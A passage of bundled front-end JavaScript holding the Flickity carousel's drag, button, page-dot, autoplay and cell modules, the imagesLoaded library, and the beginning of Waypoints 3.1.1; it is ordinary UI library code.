          t.eventie,
          t.Flickity,
          t.Unidragger,
          t.fizzyUIUtils
        )));
  })(window, function (t, e, i, n, o, r) {
    function s(t) {
      t.preventDefault ? t.preventDefault() : (t.returnValue = !1);
    }
    function a(e) {
      var i = o.getPointerPoint(e);
      return i.y - t.pageYOffset;
    }
    r.extend(n.defaults, { draggable: !0, touchVerticalScroll: !0 }),
      n.createMethods.push("_createDrag");
    var l = {};
    r.extend(l, o.prototype),
      (l._createDrag = function () {
        this.on("activate", this.bindDrag),
          this.on("uiChange", this._uiChangeDrag),
          this.on("childUIPointerDown", this._childUIPointerDownDrag),
          this.on("deactivate", this.unbindDrag);
      }),
      (l.bindDrag = function () {
        this.options.draggable &&
          !this.isDragBound &&
          (e.add(this.element, "is-draggable"),
          (this.handles = [this.viewport]),
          this.bindHandles(),
          (this.isDragBound = !0));
      }),
      (l.unbindDrag = function () {
        this.isDragBound &&
          (e.remove(this.element, "is-draggable"),
          this.unbindHandles(),
          delete this.isDragBound);
      }),
      (l.hasDragStarted = function (t) {
        return Math.abs(t.x) > 3;
      }),
      (l._uiChangeDrag = function () {
        delete this.isFreeScrolling;
      }),
      (l._childUIPointerDownDrag = function (t) {
        s(t), this.pointerDownFocus(t);
      }),
      (l.pointerDown = function (t, i) {
        this._dragPointerDown(t, i);
        var n = document.activeElement;
        n && n.blur && n != this.element && n.blur(),
          this.pointerDownFocus(t),
          (this.velocity = 0),
          e.add(this.viewport, "is-pointer-down"),
          this._bindPostStartEvents(t),
          this.dispatchEvent("pointerDown", t, [i]);
      });
    var h = { touchstart: !0, MSPointerDown: !0 },
      c = { INPUT: !0, SELECT: !0 };
    (l.pointerDownFocus = function (t) {
      !this.options.accessibility ||
        h[t.type] ||
        c[t.target.nodeName] ||
        this.element.focus();
    }),
      (l.pointerMove = function (t, e) {
        var i = this._dragPointerMove(t, e);
        this.touchVerticalScrollMove(t, e, i),
          this._dragMove(t, e, i),
          this.dispatchEvent("pointerMove", t, [e, i]);
      }),
      (l.pointerUp = function (t, i) {
        delete this.isTouchScrolling,
          e.remove(this.viewport, "is-pointer-down"),
          this.dispatchEvent("pointerUp", t, [i]),
          this._dragPointerUp(t, i);
      });
    var d = { touchmove: !0, MSPointerMove: !0 };
    return (
      (l.touchVerticalScrollMove = function (e, i, n) {
        if (
          this.options.touchVerticalScroll &&
          d[e.type] &&
          (!this.isTouchScrolling &&
            Math.abs(n.y) > 16 &&
            ((this.startScrollY = t.pageYOffset),
            (this.pointerWindowStartY = a(i)),
            (this.isTouchScrolling = !0)),
          this.isTouchScrolling)
        ) {
          var o = this.pointerWindowStartY - a(i),
            r = this.startScrollY + o;
          t.scroll(t.pageXOffset, r);
        }
      }),
      (l.dragStart = function (t, e) {
        (this.dragStartPosition = this.x),
          this.startAnimation(),
          this.dispatchEvent("dragStart", t, [e]);
      }),
      (l.dragMove = function (t, e, i) {
        this.previousDragX = this.x;
        var n = i.x,
          o = this.options.rightToLeft ? -1 : 1;
        if (
          ((this.x = this.dragStartPosition + n * o),
          !this.options.wrapAround && this.cells.length)
        ) {
          var r = Math.max(-this.cells[0].target, this.dragStartPosition);
          this.x = this.x > r ? 0.5 * (this.x - r) + r : this.x;
          var s = Math.min(-this.getLastCell().target, this.dragStartPosition);
          this.x = this.x < s ? 0.5 * (this.x - s) + s : this.x;
        }
        (this.previousDragMoveTime = this.dragMoveTime),
          (this.dragMoveTime = new Date()),
          this.dispatchEvent("dragMove", t, [e, i]);
      }),
      (l.dragEnd = function (t, e) {
        this.dragEndFlick(),
          this.options.freeScroll && (this.isFreeScrolling = !0);
        var i = this.dragEndRestingSelect();
        if (this.options.freeScroll && !this.options.wrapAround) {
          var n = this.getRestingPosition();
          this.isFreeScrolling =
            -n > this.cells[0].target && -n < this.getLastCell().target;
        } else
          this.options.freeScroll ||
            i != this.selectedIndex ||
            (i += this.dragEndBoostSelect());
        this.select(i), this.dispatchEvent("dragEnd", t, [e]);
      }),
      (l.dragEndFlick = function () {
        if (isFinite(this.previousDragX)) {
          var t = this.dragMoveTime - this.previousDragMoveTime;
          if (t) {
            t /= 1e3 / 60;
            var e = this.x - this.previousDragX;
            this.velocity = e / t;
          }
          delete this.previousDragX;
        }
      }),
      (l.dragEndRestingSelect = function () {
        var t = this.getRestingPosition(),
          e = Math.abs(this.getCellDistance(-t, this.selectedIndex)),
          i = this._getClosestResting(t, e, 1),
          n = this._getClosestResting(t, e, -1),
          o = i.distance < n.distance ? i.index : n.index;
        return (
          this.options.contain &&
            !this.options.wrapAround &&
            (o =
              Math.abs(o - this.selectedIndex) <= 1 ? this.selectedIndex : o),
          o
        );
      }),
      (l._getClosestResting = function (t, e, i) {
        for (
          var n = this.selectedIndex,
            o = 1 / 0,
            r =
              this.options.contain && !this.options.wrapAround
                ? function (t, e) {
                    return e >= t;
                  }
                : function (t, e) {
                    return e > t;
                  };
          r(e, o) &&
          ((n += i), (o = e), (e = this.getCellDistance(-t, n)), null !== e);

        )
          e = Math.abs(e);
        return { distance: o, index: n - i };
      }),
      (l.getCellDistance = function (t, e) {
        var i = this.cells.length,
          n = this.options.wrapAround && i > 1,
          o = n ? r.modulo(e, i) : e,
          s = this.cells[o];
        if (!s) return null;
        var a = n ? this.slideableWidth * Math.floor(e / i) : 0;
        return t - (s.target + a);
      }),
      (l.dragEndBoostSelect = function () {
        var t = this.getCellDistance(-this.x, this.selectedIndex);
        return t > 0 && this.velocity < -1
          ? 1
          : 0 > t && this.velocity > 1
          ? -1
          : 0;
      }),
      (l.staticClick = function (t, e) {
        var i = this.getParentCell(t.target),
          n = i && i.element,
          o = i && r.indexOf(this.cells, i);
        this.dispatchEvent("staticClick", t, [e, n, o]);
      }),
      r.extend(n.prototype, l),
      n
    );
  }),
  (function (t, e) {
    "function" == typeof define && define.amd
      ? define(
          "tap-listener/tap-listener",
          ["unipointer/unipointer"],
          function (i) {
            return e(t, i);
          }
        )
      : "object" == typeof exports
      ? (module.exports = e(t, require("unipointer")))
      : (t.TapListener = e(t, t.Unipointer));
  })(window, function (t, e) {
    function i(t) {
      this.bindTap(t);
    }
    (i.prototype = new e()),
      (i.prototype.bindTap = function (t) {
        t &&
          (this.unbindTap(),
          (this.tapElement = t),
          this._bindStartEvent(t, !0));
      }),
      (i.prototype.unbindTap = function () {
        this.tapElement &&
          (this._bindStartEvent(this.tapElement, !0), delete this.tapElement);
      });
    var n = void 0 !== t.pageYOffset;
    return (
      (i.prototype.pointerUp = function (i, o) {
        var r = e.getPointerPoint(o),
          s = this.tapElement.getBoundingClientRect(),
          a = n ? t.pageXOffset : document.body.scrollLeft,
          l = n ? t.pageYOffset : document.body.scrollTop,
          h =
            r.x >= s.left + a &&
            r.x <= s.right + a &&
            r.y >= s.top + l &&
            r.y <= s.bottom + l;
        h && this.emitEvent("tap", [this, i, o]);
      }),
      (i.prototype.destroy = function () {
        this.pointerDone(), this.unbindTap();
      }),
      i
    );
  }),
  (function (t, e) {
    "function" == typeof define && define.amd
      ? define(
          "flickity/js/prev-next-button",
          [
            "eventie/eventie",
            "./flickity",
            "tap-listener/tap-listener",
            "fizzy-ui-utils/utils",
          ],
          function (i, n, o, r) {
            return e(t, i, n, o, r);
          }
        )
      : "object" == typeof exports
      ? (module.exports = e(
          t,
          require("eventie"),
          require("./flickity"),
          require("tap-listener"),
          require("fizzy-ui-utils")
        ))
      : ((t.Flickity = t.Flickity || {}),
        (t.Flickity.PrevNextButton = e(
          t,
          t.eventie,
          t.Flickity,
          t.TapListener,
          t.fizzyUIUtils
        )));
  })(window, function (t, e, i, n, o) {
    function r(t, e) {
      (this.direction = t), (this.parent = e), this._create();
    }
    var s = "http://www.w3.org/2000/svg",
      a = (function () {
        function t() {
          if (void 0 !== e) return e;
          var t = document.createElement("div");
          return (
            (t.innerHTML = "<svg/>"),
            (e = (t.firstChild && t.firstChild.namespaceURI) == s)
          );
        }
        var e;
        return t;
      })();
    return (
      (r.prototype = new n()),
      (r.prototype._create = function () {
        (this.isEnabled = !0), (this.isPrevious = -1 == this.direction);
        var t = this.parent.options.rightToLeft ? 1 : -1;
        this.isLeft = this.direction == t;
        var e = (this.element = document.createElement("button"));
        if (
          ((e.className = "flickity-prev-next-button"),
          (e.className += this.isPrevious ? " previous" : " next"),
          e.setAttribute("type", "button"),
          i.setUnselectable(e),
          a())
        ) {
          var n = this.createSVG();
          e.appendChild(n);
        } else this.setArrowText(), (e.className += " no-svg");
        var o = this;
        (this.onCellSelect = function () {
          o.update();
        }),
          this.parent.on("cellSelect", this.onCellSelect),
          this.on("tap", this.onTap),
          this.on("pointerDown", function (t, e) {
            o.parent.childUIPointerDown(e);
          });
      }),
      (r.prototype.activate = function () {
        this.update(),
          this.bindTap(this.element),
          e.bind(this.element, "click", this),
          this.parent.element.appendChild(this.element);
      }),
      (r.prototype.deactivate = function () {
        this.parent.element.removeChild(this.element),
          n.prototype.destroy.call(this),
          e.unbind(this.element, "click", this);
      }),
      (r.prototype.createSVG = function () {
        var t = document.createElementNS(s, "svg");
        t.setAttribute("viewBox", "0 0 100 100");
        var e = document.createElementNS(s, "path");
        e.setAttribute("d", "M 50,0 L 60,10 L 20,50 L 60,90 L 50,100 L 0,50 Z"),
          e.setAttribute("class", "arrow");
        var i = this.isLeft
          ? "translate(15,0)"
          : "translate(85,100) rotate(180)";
        return e.setAttribute("transform", i), t.appendChild(e), t;
      }),
      (r.prototype.setArrowText = function () {
        var t = this.parent.options,
          e = this.isLeft ? t.leftArrowText : t.rightArrowText;
        o.setText(this.element, e);
      }),
      (r.prototype.onTap = function () {
        if (this.isEnabled) {
          this.parent.uiChange();
          var t = this.isPrevious ? "previous" : "next";
          this.parent[t]();
        }
      }),
      (r.prototype.handleEvent = o.handleEvent),
      (r.prototype.onclick = function () {
        var t = document.activeElement;
        t && t == this.element && this.onTap();
      }),
      (r.prototype.enable = function () {
        this.isEnabled || ((this.element.disabled = !1), (this.isEnabled = !0));
      }),
      (r.prototype.disable = function () {
        this.isEnabled && ((this.element.disabled = !0), (this.isEnabled = !1));
      }),
      (r.prototype.update = function () {
        var t = this.parent.cells;
        if (this.parent.options.wrapAround && t.length > 1)
          return void this.enable();
        var e = t.length ? t.length - 1 : 0,
          i = this.isPrevious ? 0 : e,
          n = this.parent.selectedIndex == i ? "disable" : "enable";
        this[n]();
      }),
      (r.prototype.destroy = function () {
        this.deactivate();
      }),
      o.extend(i.defaults, {
        prevNextButtons: !0,
        leftArrowText: "�",
        rightArrowText: "�",
      }),
      i.createMethods.push("_createPrevNextButtons"),
      (i.prototype._createPrevNextButtons = function () {
        this.options.prevNextButtons &&
          ((this.prevButton = new r(-1, this)),
          (this.nextButton = new r(1, this)),
          this.on("activate", this.activatePrevNextButtons));
      }),
      (i.prototype.activatePrevNextButtons = function () {
        this.prevButton.activate(),
          this.nextButton.activate(),
          this.on("deactivate", this.deactivatePrevNextButtons);
      }),
      (i.prototype.deactivatePrevNextButtons = function () {
        this.prevButton.deactivate(),
          this.nextButton.deactivate(),
          this.off("deactivate", this.deactivatePrevNextButtons);
      }),
      (i.PrevNextButton = r),
      r
    );
  }),
  (function (t, e) {
    "function" == typeof define && define.amd
      ? define(
          "flickity/js/page-dots",
          [
            "eventie/eventie",
            "./flickity",
            "tap-listener/tap-listener",
            "fizzy-ui-utils/utils",
          ],
          function (i, n, o, r) {
            return e(t, i, n, o, r);
          }
        )
      : "object" == typeof exports
      ? (module.exports = e(
          t,
          require("eventie"),
          require("./flickity"),
          require("tap-listener"),
          require("fizzy-ui-utils")
        ))
      : ((t.Flickity = t.Flickity || {}),
        (t.Flickity.PageDots = e(
          t,
          t.eventie,
          t.Flickity,
          t.TapListener,
          t.fizzyUIUtils
        )));
  })(window, function (t, e, i, n, o) {
    function r(t) {
      (this.parent = t), this._create();
    }
    return (
      (r.prototype = new n()),
      (r.prototype._create = function () {
        (this.holder = document.createElement("ol")),
          (this.holder.className = "flickity-page-dots"),
          i.setUnselectable(this.holder),
          (this.dots = []);
        var t = this;
        (this.onCellSelect = function () {
          t.updateSelected();
        }),
          this.parent.on("cellSelect", this.onCellSelect),
          this.on("tap", this.onTap),
          this.on("pointerDown", function (e, i) {
            t.parent.childUIPointerDown(i);
          });
      }),
      (r.prototype.activate = function () {
        this.setDots(),
          this.updateSelected(),
          this.bindTap(this.holder),
          this.parent.element.appendChild(this.holder);
      }),
      (r.prototype.deactivate = function () {
        this.parent.element.removeChild(this.holder),
          n.prototype.destroy.call(this);
      }),
      (r.prototype.setDots = function () {
        var t = this.parent.cells.length - this.dots.length;
        t > 0 ? this.addDots(t) : 0 > t && this.removeDots(-t);
      }),
      (r.prototype.addDots = function (t) {
        for (var e = document.createDocumentFragment(), i = []; t; ) {
          var n = document.createElement("li");
          (n.className = "dot"), e.appendChild(n), i.push(n), t--;
        }
        this.holder.appendChild(e), (this.dots = this.dots.concat(i));
      }),
      (r.prototype.removeDots = function (t) {
        for (
          var e = this.dots.splice(this.dots.length - t, t),
            i = 0,
            n = e.length;
          n > i;
          i++
        ) {
          var o = e[i];
          this.holder.removeChild(o);
        }
      }),
      (r.prototype.updateSelected = function () {
        this.selectedDot && (this.selectedDot.className = "dot"),
          this.dots.length &&
            ((this.selectedDot = this.dots[this.parent.selectedIndex]),
            (this.selectedDot.className = "dot is-selected"));
      }),
      (r.prototype.onTap = function (t, e) {
        var i = e.target;
        if ("LI" == i.nodeName) {
          this.parent.uiChange();
          var n = o.indexOf(this.dots, i);
          this.parent.select(n);
        }
      }),
      (r.prototype.destroy = function () {
        this.deactivate();
      }),
      (i.PageDots = r),
      o.extend(i.defaults, { pageDots: !0 }),
      i.createMethods.push("_createPageDots"),
      (i.prototype._createPageDots = function () {
        this.options.pageDots &&
          ((this.pageDots = new r(this)),
          this.on("activate", this.activatePageDots),
          this.on("cellAddedRemoved", this.onCellAddedRemovedPageDots),
          this.on("deactivate", this.deactivatePageDots));
      }),
      (i.prototype.activatePageDots = function () {
        this.pageDots.activate();
      }),
      (i.prototype.onCellAddedRemovedPageDots = function () {
        this.pageDots.setDots();
      }),
      (i.prototype.deactivatePageDots = function () {
        this.pageDots.deactivate();
      }),
      (i.PageDots = r),
      r
    );
  }),
  (function (t, e) {
    "function" == typeof define && define.amd
      ? define(
          "flickity/js/player",
          ["eventEmitter/EventEmitter", "eventie/eventie", "./flickity"],
          function (t, i, n) {
            return e(t, i, n);
          }
        )
      : "object" == typeof exports
      ? (module.exports = e(
          require("wolfy87-eventemitter"),
          require("eventie"),
          require("./flickity")
        ))
      : ((t.Flickity = t.Flickity || {}),
        (t.Flickity.Player = e(t.EventEmitter, t.eventie, t.Flickity)));
  })(window, function (t, e, i) {
    function n(t) {
      if (((this.isPlaying = !1), (this.parent = t), r)) {
        var e = this;
        this.onVisibilityChange = function () {
          e.visibilityChange();
        };
      }
    }
    var o, r;
    return (
      "hidden" in document
        ? ((o = "hidden"), (r = "visibilitychange"))
        : "webkitHidden" in document &&
          ((o = "webkitHidden"), (r = "webkitvisibilitychange")),
      (n.prototype = new t()),
      (n.prototype.play = function () {
        (this.isPlaying = !0),
          delete this.isPaused,
          r && document.addEventListener(r, this.onVisibilityChange, !1),
          this.tick();
      }),
      (n.prototype.tick = function () {
        if (this.isPlaying && !this.isPaused) {
          this.tickTime = new Date();
          var t = this.parent.options.autoPlay;
          t = "number" == typeof t ? t : 3e3;
          var e = this;
          this.timeout = setTimeout(function () {
            e.parent.next(!0), e.tick();
          }, t);
        }
      }),
      (n.prototype.stop = function () {
        (this.isPlaying = !1),
          delete this.isPaused,
          this.clear(),
          r && document.removeEventListener(r, this.onVisibilityChange, !1);
      }),
      (n.prototype.clear = function () {
        clearTimeout(this.timeout);
      }),
      (n.prototype.pause = function () {
        this.isPlaying && ((this.isPaused = !0), this.clear());
      }),
      (n.prototype.unpause = function () {
        this.isPaused && this.play();
      }),
      (n.prototype.visibilityChange = function () {
        var t = document[o];
        this[t ? "pause" : "unpause"]();
      }),
      i.createMethods.push("_createPlayer"),
      (i.prototype._createPlayer = function () {
        (this.player = new n(this)),
          this.on("activate", this.activatePlayer),
          this.on("uiChange", this.stopPlayer),
          this.on("pointerDown", this.stopPlayer),
          this.on("deactivate", this.deactivatePlayer);
      }),
      (i.prototype.activatePlayer = function () {
        this.options.autoPlay &&
          (this.player.play(),
          e.bind(this.element, "mouseenter", this),
          (this.isMouseenterBound = !0));
      }),
      (i.prototype.stopPlayer = function () {
        this.player.stop();
      }),
      (i.prototype.deactivatePlayer = function () {
        this.player.stop(),
          this.isMouseenterBound &&
            (e.unbind(this.element, "mouseenter", this),
            delete this.isMouseenterBound);
      }),
      (i.prototype.onmouseenter = function () {
        this.player.pause(), e.bind(this.element, "mouseleave", this);
      }),
      (i.prototype.onmouseleave = function () {
        this.player.unpause(), e.unbind(this.element, "mouseleave", this);
      }),
      (i.Player = n),
      n
    );
  }),
  (function (t, e) {
    "function" == typeof define && define.amd
      ? define(
          "flickity/js/add-remove-cell",
          ["./flickity", "fizzy-ui-utils/utils"],
          function (i, n) {
            return e(t, i, n);
          }
        )
      : "object" == typeof exports
      ? (module.exports = e(
          t,
          require("./flickity"),
          require("fizzy-ui-utils")
        ))
      : ((t.Flickity = t.Flickity || {}),
        (t.Flickity = e(t, t.Flickity, t.fizzyUIUtils)));
  })(window, function (t, e, i) {
    function n(t) {
      for (
        var e = document.createDocumentFragment(), i = 0, n = t.length;
        n > i;
        i++
      ) {
        var o = t[i];
        e.appendChild(o.element);
      }
      return e;
    }
    return (
      (e.prototype.insert = function (t, e) {
        var i = this._makeCells(t);
        if (i && i.length) {
          var o = this.cells.length;
          e = void 0 === e ? o : e;
          var r = n(i),
            s = e == o;
          if (s) this.slider.appendChild(r);
          else {
            var a = this.cells[e].element;
            this.slider.insertBefore(r, a);
          }
          if (0 === e) this.cells = i.concat(this.cells);
          else if (s) this.cells = this.cells.concat(i);
          else {
            var l = this.cells.splice(e, o - e);
            this.cells = this.cells.concat(i).concat(l);
          }
          this._sizeCells(i);
          var h = e > this.selectedIndex ? 0 : i.length;
          this._cellAddedRemoved(e, h);
        }
      }),
      (e.prototype.append = function (t) {
        this.insert(t, this.cells.length);
      }),
      (e.prototype.prepend = function (t) {
        this.insert(t, 0);
      }),
      (e.prototype.remove = function (t) {
        var e,
          n,
          o,
          r = this.getCells(t),
          s = 0;
        for (e = 0, n = r.length; n > e; e++) {
          o = r[e];
          var a = i.indexOf(this.cells, o) < this.selectedIndex;
          s -= a ? 1 : 0;
        }
        for (e = 0, n = r.length; n > e; e++)
          (o = r[e]), o.remove(), i.removeFrom(this.cells, o);
        r.length && this._cellAddedRemoved(0, s);
      }),
      (e.prototype._cellAddedRemoved = function (t, e) {
        (e = e || 0),
          (this.selectedIndex += e),
          (this.selectedIndex = Math.max(
            0,
            Math.min(this.cells.length - 1, this.selectedIndex)
          )),
          this.emitEvent("cellAddedRemoved", [t, e]),
          this.cellChange(t);
      }),
      (e.prototype.cellSizeChange = function (t) {
        var e = this.getCell(t);
        if (e) {
          e.getSize();
          var n = i.indexOf(this.cells, e);
          this.cellChange(n);
        }
      }),
      (e.prototype.cellChange = function (t) {
        (t = t || 0),
          this._positionCells(t),
          this._getWrapShiftCells(),
          this.setGallerySize(),
          this.options.freeScroll
            ? this.positionSlider()
            : (this.positionSliderAtSelected(),
              this.select(this.selectedIndex));
      }),
      e
    );
  }),
  (function (t, e) {
    "function" == typeof define && define.amd
      ? define(
          "flickity/js/index",
          [
            "./flickity",
            "./drag",
            "./prev-next-button",
            "./page-dots",
            "./player",
            "./add-remove-cell",
          ],
          e
        )
      : "object" == typeof exports &&
        (module.exports = e(
          require("./flickity"),
          require("./drag"),
          require("./prev-next-button"),
          require("./page-dots"),
          require("./player"),
          require("./add-remove-cell")
        ));
  })(window, function (t) {
    return t;
  }),
  (function (t, e) {
    "function" == typeof define && define.amd
      ? define(
          "flickity-as-nav-for/as-nav-for",
          ["classie/classie", "flickity/js/index", "fizzy-ui-utils/utils"],
          function (i, n, o) {
            return e(t, i, n, o);
          }
        )
      : "object" == typeof exports
      ? (module.exports = e(
          t,
          require("dessandro-classie"),
          require("flickity"),
          require("fizzy-ui-utils")
        ))
      : (t.Flickity = e(t, t.classie, t.Flickity, t.fizzyUIUtils));
  })(window, function (t, e, i, n) {
    return (
      i.createMethods.push("_createAsNavFor"),
      (i.prototype._createAsNavFor = function () {
        this.on("activate", this.activateAsNavFor),
          this.on("deactivate", this.deactivateAsNavFor),
          this.on("destroy", this.destroyAsNavFor);
        var t = this.options.asNavFor;
        if (t) {
          var e = this;
          setTimeout(function () {
            e.setNavCompanion(t);
          });
        }
      }),
      (i.prototype.setNavCompanion = function (t) {
        t = n.getQueryElement(t);
        var e = i.data(t);
        if (e && e != this) {
          this.navCompanion = e;
          var o = this;
          (this.onNavCompanionSelect = function () {
            o.navCompanionSelect();
          }),
            e.on("cellSelect", this.onNavCompanionSelect),
            this.on("staticClick", this.onNavStaticClick),
            this.navCompanionSelect();
        }
      }),
      (i.prototype.navCompanionSelect = function () {
        if (this.navCompanion) {
          var t = this.navCompanion.selectedIndex;
          this.select(t),
            this.removeNavSelectedElement(),
            this.selectedIndex == t &&
              ((this.navSelectedElement = this.cells[t].element),
              e.add(this.navSelectedElement, "is-nav-selected"));
        }
      }),
      (i.prototype.activateAsNavFor = function () {
        this.navCompanionSelect();
      }),
      (i.prototype.removeNavSelectedElement = function () {
        this.navSelectedElement &&
          (e.remove(this.navSelectedElement, "is-nav-selected"),
          delete this.navSelectedElement);
      }),
      (i.prototype.onNavStaticClick = function (t, e, i, n) {
        "number" == typeof n && this.navCompanion.select(n);
      }),
      (i.prototype.deactivateAsNavFor = function () {
        this.removeNavSelectedElement();
      }),
      (i.prototype.destroyAsNavFor = function () {
        this.navCompanion &&
          (this.navCompanion.off("cellSelect", this.onNavCompanionSelect),
          this.off("staticClick", this.onNavStaticClick),
          delete this.navCompanion);
      }),
      i
    );
  }),
  (function (t, e) {
    "function" == typeof define && define.amd
      ? define(
          "imagesloaded/imagesloaded",
          ["eventEmitter/EventEmitter", "eventie/eventie"],
          function (i, n) {
            return e(t, i, n);
          }
        )
      : "object" == typeof exports
      ? (module.exports = e(
          t,
          require("wolfy87-eventemitter"),
          require("eventie")
        ))
      : (t.imagesLoaded = e(t, t.EventEmitter, t.eventie));
  })(window, function (t, e, i) {
    function n(t, e) {
      for (var i in e) t[i] = e[i];
      return t;
    }
    function o(t) {
      return "[object Array]" === p.call(t);
    }
    function r(t) {
      var e = [];
      if (o(t)) e = t;
      else if ("number" == typeof t.length)
        for (var i = 0, n = t.length; n > i; i++) e.push(t[i]);
      else e.push(t);
      return e;
    }
    function s(t, e, i) {
      if (!(this instanceof s)) return new s(t, e);
      "string" == typeof t && (t = document.querySelectorAll(t)),
        (this.elements = r(t)),
        (this.options = n({}, this.options)),
        "function" == typeof e ? (i = e) : n(this.options, e),
        i && this.on("always", i),
        this.getImages(),
        h && (this.jqDeferred = new h.Deferred());
      var o = this;
      setTimeout(function () {
        o.check();
      });
    }
    function a(t) {
      this.img = t;
    }
    function l(t) {
      (this.src = t), (u[t] = this);
    }
    var h = t.jQuery,
      c = t.console,
      d = "undefined" != typeof c,
      p = Object.prototype.toString;
    (s.prototype = new e()),
      (s.prototype.options = {}),
      (s.prototype.getImages = function () {
        this.images = [];
        for (var t = 0, e = this.elements.length; e > t; t++) {
          var i = this.elements[t];
          "IMG" === i.nodeName && this.addImage(i);
          var n = i.nodeType;
          if (n && (1 === n || 9 === n || 11 === n))
            for (
              var o = i.querySelectorAll("img"), r = 0, s = o.length;
              s > r;
              r++
            ) {
              var a = o[r];
              this.addImage(a);
            }
        }
      }),
      (s.prototype.addImage = function (t) {
        var e = new a(t);
        this.images.push(e);
      }),
      (s.prototype.check = function () {
        function t(t, o) {
          return (
            e.options.debug && d && c.log("confirm", t, o),
            e.progress(t),
            i++,
            i === n && e.complete(),
            !0
          );
        }
        var e = this,
          i = 0,
          n = this.images.length;
        if (((this.hasAnyBroken = !1), !n)) return void this.complete();
        for (var o = 0; n > o; o++) {
          var r = this.images[o];
          r.on("confirm", t), r.check();
        }
      }),
      (s.prototype.progress = function (t) {
        this.hasAnyBroken = this.hasAnyBroken || !t.isLoaded;
        var e = this;
        setTimeout(function () {
          e.emit("progress", e, t),
            e.jqDeferred && e.jqDeferred.notify && e.jqDeferred.notify(e, t);
        });
      }),
      (s.prototype.complete = function () {
        var t = this.hasAnyBroken ? "fail" : "done";
        this.isComplete = !0;
        var e = this;
        setTimeout(function () {
          if ((e.emit(t, e), e.emit("always", e), e.jqDeferred)) {
            var i = e.hasAnyBroken ? "reject" : "resolve";
            e.jqDeferred[i](e);
          }
        });
      }),
      h &&
        (h.fn.imagesLoaded = function (t, e) {
          var i = new s(this, t, e);
          return i.jqDeferred.promise(h(this));
        }),
      (a.prototype = new e()),
      (a.prototype.check = function () {
        var t = u[this.img.src] || new l(this.img.src);
        if (t.isConfirmed)
          return void this.confirm(t.isLoaded, "cached was confirmed");
        if (this.img.complete && void 0 !== this.img.naturalWidth)
          return void this.confirm(0 !== this.img.naturalWidth, "naturalWidth");
        var e = this;
        t.on("confirm", function (t, i) {
          return e.confirm(t.isLoaded, i), !0;
        }),
          t.check();
      }),
      (a.prototype.confirm = function (t, e) {
        (this.isLoaded = t), this.emit("confirm", this, e);
      });
    var u = {};
    return (
      (l.prototype = new e()),
      (l.prototype.check = function () {
        if (!this.isChecked) {
          var t = new Image();
          i.bind(t, "load", this),
            i.bind(t, "error", this),
            (t.src = this.src),
            (this.isChecked = !0);
        }
      }),
      (l.prototype.handleEvent = function (t) {
        var e = "on" + t.type;
        this[e] && this[e](t);
      }),
      (l.prototype.onload = function (t) {
        this.confirm(!0, "onload"), this.unbindProxyEvents(t);
      }),
      (l.prototype.onerror = function (t) {
        this.confirm(!1, "onerror"), this.unbindProxyEvents(t);
      }),
      (l.prototype.confirm = function (t, e) {
        (this.isConfirmed = !0),
          (this.isLoaded = t),
          this.emit("confirm", this, e);
      }),
      (l.prototype.unbindProxyEvents = function (t) {
        i.unbind(t.target, "load", this), i.unbind(t.target, "error", this);
      }),
      s
    );
  }),
  (function (t, e) {
    "function" == typeof define && define.amd
      ? define(
          ["flickity/js/index", "imagesloaded/imagesloaded"],
          function (i, n) {
            return e(t, i, n);
          }
        )
      : "object" == typeof exports
      ? (module.exports = e(t, require("flickity"), require("imagesloaded")))
      : (t.Flickity = e(t, t.Flickity, t.imagesLoaded));
  })(window, function (t, e, i) {
    return (
      e.createMethods.push("_createImagesLoaded"),
      (e.prototype._createImagesLoaded = function () {
        this.on("activate", this.imagesLoaded);
      }),
      (e.prototype.imagesLoaded = function () {
        function t(t, i) {
          var n = e.getParentCell(i.img);
          e.cellSizeChange(n && n.element);
        }
        if (this.options.imagesLoaded) {
          var e = this;
          i(this.slider).on("progress", t);
        }
      }),
      e
    );
  });

/*!
Waypoints - 3.1.1
Copyright � 2011-2015 Caleb Troughton
Licensed under the MIT license.
https://github.com/imakewebthings/waypoints/blog/master/licenses.txt
*/
!(function () {
  "use strict";
  function t(o) {
    if (!o) throw new Error("No options passed to Waypoint constructor");
    if (!o.element)
      throw new Error("No element option passed to Waypoint constructor");
    if (!o.handler)
      throw new Error("No handler option passed to Waypoint constructor");
    (this.key = "waypoint-" + e),
      (this.options = t.Adapter.extend({}, t.defaults, o)),
      (this.element = this.options.element),
      (this.adapter = new t.Adapter(this.element)),
      (this.callback = o.handler),
      (this.axis = this.options.horizontal ? "horizontal" : "vertical"),
      (this.enabled = this.options.enabled),
      (this.triggerPoint = null),
      (this.group = t.Group.findOrCreate({
        name: this.options.group,
        axis: this.axis,
      })),
      (this.context = t.Context.findOrCreateByElement(this.options.context)),
      t.offsetAliases[this.options.offset] &&
        (this.options.offset = t.offsetAliases[this.options.offset]),
      this.group.add(this),
      this.context.add(this),
      (i[this.key] = this),
      (e += 1);
  }
  var e = 0,
    i = {};
  (t.prototype.queueTrigger = function (t) {
    this.group.queueTrigger(this, t);
  }),
    (t.prototype.trigger = function (t) {
      this.enabled && this.callback && this.callback.apply(this, t);
    }),
    (t.prototype.destroy = function () {
      this.context.remove(this), this.group.remove(this), delete i[this.key];
    }),
    (t.prototype.disable = function () {
      return (this.enabled = !1), this;
    }),
    (t.prototype.enable = function () {
      return this.context.refresh(), (this.enabled = !0), this;
    }),
    (t.prototype.next = function () {
      return this.group.next(this);
    }),
    (t.prototype.previous = function () {
      return this.group.previous(this);
    }),
    (t.invokeAll = function (t) {
      var e = [];
      for (var o in i) e.push(i[o]);
      for (var n = 0, r = e.length; r > n; n++) e[n][t]();
    }),
    (t.destroyAll = function () {
      t.invokeAll("destroy");
    }),
    (t.disableAll = function () {
      t.invokeAll("disable");
    }),
    (t.enableAll = function () {
      t.invokeAll("enable");
    }),
    (t.refreshAll = function () {
      t.Context.refreshAll();
    }),
    (t.viewportHeight = function () {
      return window.innerHeight || document.documentElement.clientHeight;
    }),
    (t.viewportWidth = function () {
      return document.documentElement.clientWidth;
    }),
    (t.adapters = []),
    (t.defaults = {
      context: window,
      continuous: !0,
      enabled: !0,
      group: "default",
      horizontal: !1,
      offset: 0,
    }),
    (t.offsetAliases = {
      "bottom-in-view": function () {
        return this.context.innerHeight() - this.adapter.outerHeight();
      },
      "right-in-view": function () {
        return this.context.innerWidth() - this.adapter.outerWidth();
      },
    }),
    (window.Waypoint = t);
})(),
  (function () {
    "use strict";
    function t(t) {
      window.setTimeout(t, 1e3 / 60);
    }
    function e(t) {
      (this.element = t),
        (this.Adapter = n.Adapter),
        (this.adapter = new this.Adapter(t)),
        (this.key = "waypoint-context-" + i),
        (this.didScroll = !1),
        (this.didResize = !1),
        (this.oldScroll = {
